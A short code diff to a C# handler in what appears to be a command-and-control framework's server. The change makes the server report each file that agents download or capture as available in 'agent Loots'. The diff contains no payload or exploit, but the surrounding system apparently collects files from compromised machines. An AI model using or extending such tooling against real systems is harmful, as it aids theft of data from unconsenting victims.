@@ -1,3 +1,4 @@
+using System;
 using System.Collections.Generic;
 using System.Threading.Tasks;
 using BinarySerializer;
@@ -19,16 +20,21 @@ public class TaskFrameHandler : FrameHandler
         {
             var file = await taskOutput.Objects.BinaryDeserializeAsync<DownloadFile>();
             taskOutput.Objects = null;
+            if (taskOutput.Output == null) taskOutput.Output = string.Empty;
             await this.Server.LootService.AddFileAsync(agent.Id, file.FileName, file.Data);
+            taskOutput.Output += $"File {file.FileName} available in agent Loots" + Environment.NewLine;
+
         }
 
         if (task != null && task.CommandId == CommandId.Capture && taskOutput.Objects != null)
         {
             var files = await taskOutput.Objects.BinaryDeserializeAsync<List<DownloadFile>>();
             taskOutput.Objects = null;
-            foreach(var file in files)
+            if (taskOutput.Output == null) taskOutput.Output = string.Empty;
+            foreach (var file in files)
             {
                 await this.Server.LootService.AddFileAsync(agent.Id, file.FileName, file.Data);
+                taskOutput.Output += $"File {file.FileName} available in agent Loots" + Environment.NewLine;
             }
         }
 
